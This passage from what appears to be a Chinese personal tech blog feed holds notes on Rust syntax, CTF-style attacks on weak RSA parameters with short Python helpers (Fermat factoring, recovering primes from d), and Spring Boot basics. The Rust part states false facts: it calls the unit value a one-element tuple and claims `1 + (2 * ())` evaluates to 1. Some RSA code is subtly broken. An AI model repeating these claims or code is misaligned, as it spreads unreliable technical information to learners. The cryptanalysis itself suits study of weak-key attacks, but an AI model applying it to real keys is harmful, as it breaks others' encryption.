<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这个函数的参数类型为 `()`，表示它不需要任何参数。在函数体中，参数名被写作 `_`，这是一种占位符，表示这个参数不会被使用。</span><br><span class="line"></span><br><span class="line">`()` 还可以用于元组类型中，作为元组中没有元素的占位符，例如：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>let empty_tuple: () = ();</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这个代码定义了一个空元组，它只包含一个值 `()`。空元组在 Rust 中也被称为“单元素元组”。</span><br><span class="line"></span><br><span class="line">除此之外，`()` 还可以用于表达式中，例如：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>rustCopy code<br />
let x = 1 + (2 * ());</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这个表达式中使用了空元组 `()`，它在这里充当了一个占位符的作用，表示这里的乘法操作不需要任何值参与，因此得到的结果仍然是 1。</span><br><span class="line"></span><br><span class="line">总的来说，`()` 在 Rust 中有多重作用，它可以表示空值、没有返回值的函数、不需要参数的函数、空元组等等。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 变量解构</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>struct Struct {<br />
e: i32<br />
}</p>
<p>fn main() {<br />
let (a, b, c, d, e);</p>
<pre><code>(a, b) = (1, 2);
// _ 代表匹配一个值，但是我们不关心具体的值是什么，因此没有使用一个变量名而是使用了 _
[c, .., d, _] = [1, 2, 3, 4, 5];
Struct &#123; e &#125; = Struct &#123; e: 5 &#125;;

assert_eq!([1, 2, 1, 4, 5], [a, b, c, d, e]);
</code></pre>
<p>}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>… 表示匹配一个序列中的所有剩余元素，例如 let [a, b, …] = [1, 2, 3, 4, 5] 将会把 a 和 b 分别赋值为 1 和 2，而剩余的元素 [3, 4, 5] 则会被忽略。<br />
_ 被称为通配符（wildcard），它可以匹配任何类型的值，并且不会将匹配到的值绑定到任何变量上。因此，通配符 _ 可以用于丢弃不需要的值。<br />
name @ pattern 表示将匹配到的值绑定到一个变量上，并且同时匹配一个模式。例如，match Some(42) { Some(n @ 1…=100) =&gt; println!(“Got a number between 1 and 100: {}”, n), _ =&gt; () } 表示如果匹配到的是 Some 枚举的值，并且这个值在 1 到 100 的范围内，则将其赋值给变量 n，并打印一条信息。在一个 match 表达式中，_ 可以被用作最后一个分支的模式，它可以匹配所有未被之前分支匹配到的情况。这个分支通常被称为“捕获所有”分支（catch-all branch）或者“默认”分支（default branch）。通常，当我们不需要对某个分支进行处理时，可以使用“捕获所有”分支来忽略它。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">其中</span><br><span class="line"></span><br><span class="line">在 Rust 中，`let (a, b, c, d, e);` 和 `let [a, b, c, d, e];` 的区别在于：</span><br><span class="line"></span><br><span class="line">- `let (a, b, c, d, e);` 是解构元组的语法</span><br><span class="line">- `let [a, b, c, d, e];` 是解构数组的语法</span><br><span class="line"></span><br><span class="line">### 变量遮蔽</span><br><span class="line"></span><br><span class="line">允许重复定义，相同的变量名字，不同的内存</span><br><span class="line"></span><br><span class="line">&#123;&#125;会划分层次，不同层次按照就近原则在本身的层次中使用变量</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>fn main() {<br />
let x = 5;<br />
// 在main函数的作用域内对之前的x进行遮蔽<br />
let x = x + 1;</p>
<pre><code>&#123;
    // 在当前的花括号作用域内，对之前的x进行遮蔽
    let x = x * 2;
    println!(&quot;The value of x in the inner scope is: &#123;&#125;&quot;, x);
&#125;

println!(&quot;The value of x is: &#123;&#125;&quot;, x);
</code></pre>
<p>}</p>
<pre><code>

</code></pre>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>rsa_attack</title>
    <url>/2023/02/25/14-02-30/</url>
    <content><![CDATA[<h2 id="分解n">分解n</h2>
<span id="more"></span>
<p>1.当n比较小的情况下，使用sagemath的factor或者<a href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a></p>
<p>2.当生成的p，q接近的时候，使用费马分解或者yafu分解</p>
<p>理论证明：<br />
$$<br />
因为|p-q|小，则|p-q|^2小<br />
$$</p>
<p>$$<br />
那么\frac{|p+q|^2}{4}=\frac{|p-q|^2}{4}+n略大于n<br />
$$</p>
<p>$$<br />
对于\frac{|p+q|^2}{4}-n=\frac{|p+q|^2}{4}-p*q=\frac{|p-q|^2}{4}就小<br />
$$</p>
<p>$$<br />
\frac{|p+q|}{2}也略大于\sqrt{n}那么从\sqrt{n}开始寻找到一个x，<br />
$$</p>
<p>$$<br />
满足x^2-n=y^2为一个完全平方数，其中x=\frac{|p+q|}{2}，y=\frac{|p-q|}{2}，这样就分解出p，q<br />
$$</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def fermat(n):</span><br><span class="line">    a = isqrt(n)</span><br><span class="line">    b2 = a * a - n</span><br><span class="line">    b = isqrt(n)</span><br><span class="line">    count = 0</span><br><span class="line">    while b * b != b2:</span><br><span class="line">        a = a + 1</span><br><span class="line">        b2 = a * a - n</span><br><span class="line">        b = isqrt(b2)</span><br><span class="line">        count += 1</span><br><span class="line">    p = a + b</span><br><span class="line">    q = a - b</span><br><span class="line">    assert n == p * q</span><br><span class="line">    return p, q</span><br></pre></td></tr></table></figure>
<p>3.出现多个pi得到n的情况下，注意是否有重复的pi，不可单纯使用(pi-1)的手法获得phi，注意使用欧拉公式来计算phi</p>
<p>需要得到标准分解式子，<br />
$$<br />
n=\prod_{i=1}^{m}{p_i}^{k_i}<br />
$$</p>
<p>然后<br />
$$<br />
phi=\prod_{i=1}^{m}{p_i}^{k_i-1}({p_i}-1)<br />
$$</p>
<h2 id="特殊情况下的e，p，q">特殊情况下的e，p，q</h2>
<h3 id="第一大种情况：e特殊">第一大种情况：e特殊</h3>
<p>1.如果e过于小<br />
$$<br />
c\equiv m^e \pmod p<br />
$$</p>
<p>$$<br />
m^e = c+k\times N<br />
$$</p>
<p>$$<br />
m = \sqrt[e]{c+k\times n}<br />
不难直接爆破k获得m<br />
$$</p>
<p>2.如果e刚好等于2时</p>
<p>e=2会得到一种基于RSA的衍生算法，Rabin算法，根据上面的公式不难想出<br />
$$<br />
m_p \equiv \sqrt{c} \bmod p<br />
$$</p>
<p>$$<br />
m_q \equiv \sqrt{c} \bmod q<br />
$$</p>
<p>根据扩展欧几里得公式可以求出<br />
$$<br />
y_p \cdot p + y_q \cdot q = 1 中的y_p和y_q<br />
$$<br />
根据孙子定理解出4个明文<br />
$$<br />
a = (y_p \cdot p \cdot m_q + y_q \cdot q \cdot m_p)\bmod n<br />
$$</p>
<p>$$<br />
b = n - a<br />
$$</p>
<p>$$<br />
c = (y_p \cdot p \cdot m_q - y_q \cdot q \cdot m_p) \bmod n\<br />
$$</p>
<p>$$<br />
d = n - c<br />
$$</p>
<p>ps:其中一般来说<br />
$$<br />
p \equiv q \equiv 3 \pmod 4<br />
$$<br />
则费马小定理计算的知识<br />
$$<br />
m_p \equiv c^\frac{(p+1)}{4} \bmod p\<br />
$$</p>
<p>$$<br />
m_q \equiv c^\frac{(q+1)}{4} \bmod q<br />
$$</p>
<p>3.多个k进行多轮的加密，并且已知e，d，phi<br />
$$<br />
设c \equiv m^{k1k2k3…}\pmod n<br />
$$</p>
<p>$$<br />
设m^{x} \equiv c \pmod n<br />
$$</p>
<p>$$<br />
存在ed - 1=k*phi<br />
$$</p>
<p>$$<br />
y \equiv x^{-1} \pmod {k*phi}<br />
$$</p>
<p>$$<br />
xy \equiv 1\pmod {phi}<br />
$$</p>
<p>$$<br />
c^{y} \equiv m^{xy} \equiv m \pmod n<br />
$$</p>
<p>4.根据3的问题，如果已知d，如何对p，q进行恢复</p>
<p><a href="https://www.di-mgt.com.au/rsa_factorize_n.html">https://www.di-mgt.com.au/rsa_factorize_n.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def gcd(a, b):</span><br><span class="line">   if a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   while b != 0:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   return a</span><br><span class="line"> </span><br><span class="line">def getpq(n,e,d):</span><br><span class="line">        p = 1</span><br><span class="line">        q = 1</span><br><span class="line">        while p==1 and q==1:</span><br><span class="line">                k = d * e - 1</span><br><span class="line">                g = random.randint ( 0 , n )</span><br><span class="line">                while p==1 and q==1 and k % 2 == 0:</span><br><span class="line">                        k /= 2</span><br><span class="line">                        y = pow(g,k,n)</span><br><span class="line">                        if y!=1 and gcd(y-1,n)&gt;1:</span><br><span class="line">                                p = gcd(y-1,n)</span><br><span class="line">                                q = n/p</span><br><span class="line">        return p,q</span><br></pre></td></tr></table></figure>
<h3 id="第二大种情况：p，q特殊">第二大种情况：p，q特殊</h3>
<p>1.p与q的生成具有一定的关系，那么</p>
<p>法一：可以根据n=p*q关系求出一个近似p的值，去寻找符合条件的p或者q值</p>
<p>法二：可以使用高位爆破的方法对p进行爆破，通过检测生成的n值进行寻找</p>
<p>2.p-1或者p+1是光滑的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import getPrime</span><br></pre></td></tr></table></figure>
<p>所生成的素数是根据前10000个素数的相乘+1来生成的，那么根据p-1光滑理论</p>
<p>参考：<a href="https://blog.csdn.net/qq_42667481/article/details/106729900">https://blog.csdn.net/qq_42667481/article/details/106729900</a></p>
<p>p+1光滑</p>
<p>参考：<a href="https://blog.csdn.net/m0_62506844/article/details/125774485">https://blog.csdn.net/m0_62506844/article/details/125774485</a></p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>spring-boot</title>
    <url>/2023/08/16/17-53-10/</url>
    <content><![CDATA[<h1>spring boot learning note</h1>
<span id="more"></span>
<h2 id="idea的配置以及问题">idea的配置以及问题</h2>
<p>开启自动热部署，但是要手动进行处理（暂时没有解决，或者降级到2021版本进行处理）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">spring.devtools.restart.enabled=<span class="literal">true</span></span><br><span class="line">spring.mvc.<span class="keyword">static</span>-path-pattern=/<span class="keyword">static</span><span class="comment">/**</span></span><br><span class="line"><span class="comment">spring.web.resources.static-locations=classpath:/static</span></span><br></pre></td></tr></table></figure>
<h2 id="基本路由建立以及用法">基本路由建立以及用法</h2>
<h3 id="类的注解">类的注解</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span> <span class="comment">//只是请求数据</span></span><br><span class="line"><span class="meta">@Controller</span> <span class="comment">//请求页面和数据</span></span><br></pre></td></tr></table></figure>
<p>//上述两种注解是用于标识类的用法是用于处理http请求的</p>
<h3 id="方法的注解">方法的注解</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/&quot;)</span> <span class="comment">//用于get请求跳转</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/&quot;)</span> <span class="comment">//用于post请求跳转</span></span><br><span class="line"><span class="comment">//具有各种请求方式，但是可以直接在@RequestMapping地方直接改变</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/post&quot;, method = RequestMethod.POST)</span> <span class="comment">//可以使用value决定路由，method决定请求方式</span></span><br><span class="line"><span class="meta">@Override</span> <span class="comment">//重写方法</span></span><br></pre></td></tr></table></figure>
<h3 id="变量的注解">变量的注解</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestBody</span> <span class="comment">//限制使用json格式传参</span></span><br><span class="line"><span class="meta">@RequestParam</span> <span class="comment">//用于变量的绑定，常用于变量出现冲突的情况</span></span><br><span class="line"><span class="comment">//@RequestParam(required = false, value = &quot;file2&quot;)，false表示不一定需要该变量，value是形参</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PathVariable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用方式：</span></span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/demo2/&#123;name&#125;/&#123;id&#125;&quot;)</span>   </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">demo2</span><span class="params">(<span class="meta">@PathVariable</span> String name, <span class="meta">@PathVaribale</span> <span class="type">int</span> id)</span></span><br><span class="line">&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;get name is : &quot;</span> + name + <span class="string">&quot;, id: &quot;</span> + id);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PathParam</span>同上</span><br></pre></td></tr></table></figure>
<h3 id="静态文件">静态文件</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring.mvc.static-path-pattern=/image/**</span><br><span class="line">//用于配置静态文件访问的url，只有在出现这样的http://localhost:8080/image/1.txt这样的路径才会对静态文件进行搜索，相当于路径上的映射，真正的资源加载是在spring.resources.static-locations中决定的</span><br><span class="line"></span><br><span class="line">spring.resources.static-locations=classpath:/static,classpath:/public,classpath:/resources,classpath:/META-INF/resources</span><br><span class="line">使用“http://localhost:8080/image/1.txt”就会在上述的四个路径中依次查找是否存在“1.txt”文件，如果找到了，则返回此文件，否则返回404错误。</span><br></pre></td></tr></table></figure>
<h2 id="文件上传">文件上传</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MultipartFile file //接受文件的对象</span><br><span class="line">HttpServletRequest //HttpServletRequest对象代表客户端的请求，封装了基本的Http请求所需要的信息</span><br></pre></td></tr></table></figure>
<h3 id="MultipartFile方法">MultipartFile方法</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getName(); </span><br><span class="line"><span class="comment">// 获取表单中文件组件的名字</span></span><br><span class="line"></span><br><span class="line">getOriginalFilename();</span><br><span class="line"><span class="comment">//获取源文件的昵称</span></span><br><span class="line"></span><br><span class="line">getContentType() </span><br><span class="line"><span class="comment">//返回文件的内容类型</span></span><br><span class="line"></span><br><span class="line">isEmpty() </span><br><span class="line">判断是否为空，或者上传的文件是否有内容</span><br><span class="line"></span><br><span class="line">getSize() </span><br><span class="line">返回文件大小 以字节为单位</span><br><span class="line"></span><br><span class="line">getBytes() </span><br><span class="line"><span class="comment">//将文件内容转化成一个byte[] 返回</span></span><br><span class="line"></span><br><span class="line">getInputStream()</span><br><span class="line"><span class="comment">//返回InputStream读取文件的内容</span></span><br><span class="line"></span><br><span class="line">getResource()</span><br><span class="line"><span class="comment">//返回Resource类型，需要的话方便后续操作</span></span><br><span class="line"></span><br><span class="line">transferTo(File var1)</span><br><span class="line"><span class="comment">//transferTo是复制file文件到指定位置(比如D盘下的某个位置),不然程序执行完,文件就会消失,程序运行时,临时存储在temp这个文件夹中</span></span><br></pre></td></tr></table></figure>
<h3 id="HttpServletRequest内置方法">HttpServletRequest内置方法</h3>
<h4 id="客户机信息">客户机信息</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getRequestURL()</span><br><span class="line"><span class="comment">//返回客户端发出请求时的完整URL。</span></span><br><span class="line"></span><br><span class="line">getRequestURI()</span><br><span class="line"><span class="comment">//返回请求行中的资源名部分。</span></span><br><span class="line"></span><br><span class="line">getQueryString ()</span><br><span class="line"><span class="comment">//返回请求行中的参数部分。</span></span><br><span class="line"></span><br><span class="line">getRemoteAddr()</span><br><span class="line"><span class="comment">//返回发出请求的客户机的IP地址。</span></span><br><span class="line"></span><br><span class="line">getPathInfo()</span><br><span class="line"><span class="comment">//返回请求URL中的额外路径信息。额外路径信息是请求URL中的位于Servlet的路径之后和查询参数之前的内容，它以&quot;/&quot;开头。</span></span><br><span class="line"></span><br><span class="line">getRemoteHost()</span><br><span class="line"><span class="comment">//返回发出请求的客户机的完整主机名。</span></span><br><span class="line"></span><br><span class="line">getRemotePort()</span><br><span class="line"><span class="comment">//返回客户机所使用的网络端口号。</span></span><br><span class="line"></span><br><span class="line">getLocalAddr()</span><br><span class="line"><span class="comment">//返回WEB服务器的IP地址。</span></span><br><span class="line"></span><br><span class="line">getLocalName()</span><br><span class="line"><span class="comment">//返回WEB服务器的主机名。</span></span><br></pre></td></tr></table></figure>
<h4 id="客户机请求头">客户机请求头</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getHeader(string name)方法:String</span><br><span class="line"></span><br><span class="line"><span class="title function_">getHeaders</span><span class="params">(String name)</span>方法:Enumeration</span><br><span class="line"></span><br><span class="line"><span class="title function_">getHeaderNames</span><span class="params">()</span>方法</span><br></pre></td></tr></table></figure>
<h4 id="绝对路径获取">绝对路径获取</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getServletContext().getRealPath(path)</span><br></pre></td></tr></table></figure>
<h2 id="拦截器">拦截器</h2>
<p><img src="/img/image-20230713132824655.png" alt="image-20230713132824655" /></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">login</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response,Object handler)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;login sucess &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继承HandlerInterceptor（拦截器类），重写preHandle，在内部可以添加条件以此判断是否给予权限，相当于一个身份判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span>&#123;</span><br><span class="line">        registry.addInterceptor(<span class="keyword">new</span> <span class="title class_">login</span>()).addPathPatterns();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用Configuration注解（自动读取，表明当前类是一个配置类），继承WebMvcConfigurer（配置类），重写addInterceptors，使用addInterceptor表明拦截逻辑的调用，addPathPatterns表明了是拦截访问的路径（权限分级和区分）</p>
<h2 id="sql">sql</h2>
<h3 id="单表查询与条件查询">单表查询与条件查询</h3>
<p>引入配置</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        MyBatisP1us依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        -mysql驱动依赖一&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        数据连接池druid--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.20<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@MapperScan  //当Mapper过多的时候，为了方便，给主程序添加MapperScan，作用就是会自动扫描并且给指定路径下的所有文件自动添加Mapper注解</span><br></pre></td></tr></table></figure>
<p>UserMap.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMap</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from user&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">find</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Insert(&quot;INSERT INTO user VALUES (#&#123;username&#125;,#&#123;password&#125;)&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(User user)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写map（即定义sql语句文件下），使用interface实现多重继承，以便完成更多操作，可以对接下来的sql语句进行修改</span></span><br></pre></td></tr></table></figure>
<p>在另外专门控制sql的地方进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserContrllor</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMap userMap;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/user&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List <span class="title function_">query</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;User&gt; list = userMap.find();</span><br><span class="line"><span class="comment">//        System.out.println(list);</span></span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/user&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">save</span><span class="params">(User user)</span>&#123;</span><br><span class="line">        userMap.insert(user);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;sucess&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中@Autowired可以自动将语句进行注入，然后实例化usermap进行调用对应函数即可，对于变量只需要使用**#{value}**进行放置，然后引入的包就会自动将变量对应注入（注意变量名需要和数据库的名称相同）</p>
<p>除此之外还可以使用其他的方法进行实现sql</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Mapper</span><br><span class="line">public interface UserMap  extends BaseMapper&lt;User&gt; &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接继承BaseMapper类对其进行使用，但是从灵活性来说可以自定义出一个类对其进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.update.UpdateWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 查询操作</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUserByName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">        <span class="keyword">return</span> userMapper.selectOne(queryWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 插入操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addUser</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        userMapper.insert(user);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 更新操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateUser</span><span class="params">(User user)</span> &#123;</span><br><span class="line">        UpdateWrapper&lt;User&gt; updateWrapper = <span class="keyword">new</span> <span class="title class_">UpdateWrapper</span>&lt;&gt;();</span><br><span class="line">        updateWrapper.eq(<span class="string">&quot;id&quot;</span>, user.getId())</span><br><span class="line">                .set(<span class="string">&quot;name&quot;</span>, user.getName())</span><br><span class="line">                .set(<span class="string">&quot;age&quot;</span>, user.getAge());</span><br><span class="line">        userMapper.update(<span class="literal">null</span>, updateWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 删除操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteUserByName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">        userMapper.delete(queryWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where		WHERE 语句，拼接 + WHERE 条件</span><br><span class="line">and			AND 语句，拼接 + AND 字段=值</span><br><span class="line">andNew		AND 语句，拼接 + AND (字段=值)</span><br><span class="line">or			OR 语句，拼接 + OR 字段=值</span><br><span class="line">orNew		OR 语句，拼接 + OR (字段=值)</span><br><span class="line">eq			等于=</span><br><span class="line">allEq		基于 map 内容等于=</span><br><span class="line">ne			不等于&lt;&gt;</span><br><span class="line">gt			大于&gt;</span><br><span class="line">ge			大于等于&gt;=</span><br><span class="line">lt			小于&lt;</span><br><span class="line">le			小于等于&lt;=</span><br><span class="line">like		模糊查询 LIKE</span><br><span class="line">notLike		模糊查询 NOT LIKE</span><br><span class="line">in	IN 		查询</span><br><span class="line">notIn		NOT IN 查询</span><br><span class="line">isNull		NULL 值查询</span><br><span class="line">isNotNull	IS NOT NULL</span><br><span class="line">groupBy		分组 GROUP BY</span><br><span class="line">having		HAVING 关键词</span><br><span class="line">orderBy		排序 ORDER BY</span><br><span class="line">orderAsc	ASC 排序 ORDER BY</span><br><span class="line">orderDesc	DESC 排序 ORDER BY</span><br><span class="line">exists		EXISTS 条件语句</span><br><span class="line">notExists	NOT EXISTS 条件语句</span><br><span class="line">between		BETWEEN 条件语句</span><br><span class="line">notBetween	NOT BETWEEN 条件语句</span><br><span class="line">addFilter	自由拼接 SQL</span><br><span class="line">last		拼接在最后，例如：last(&quot;LIMIT 1&quot;)</span><br></pre></td></tr></table></figure>
<p>以及会出现需要操作的类和sql中的表明不一样的情况，那么就可以对需要操作的类进行注解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@TableName(&quot;user&quot;)</span><br><span class="line">@TableId(type = IdType.AUTO) //定义自增的id值</span><br><span class="line">@TableField(value = &quot;username&quot;,exist = true) //定义字段名（两者冲突）以及是否存在</span><br></pre></td></tr></table></figure>
<p><a href="https://baomidou.com/pages/49cc81/#delete">CRUD 接口 | MyBatis-Plus (baomidou.com)</a></p>
<h3 id="多表查询">多表查询</h3>
<p>新建一个OrderMap.java</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Mapper</span><br><span class="line">public interface OrderMap  extends BaseMapper&lt;User&gt; &#123;</span><br><span class="line">    @Select(&quot;select * from t_order where userid = #&#123;userid&#125;&quot;)</span><br><span class="line">    int selectOrder(int userid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>里面写入查询语句和条件</p>
<p>在UserMap中写入</p>
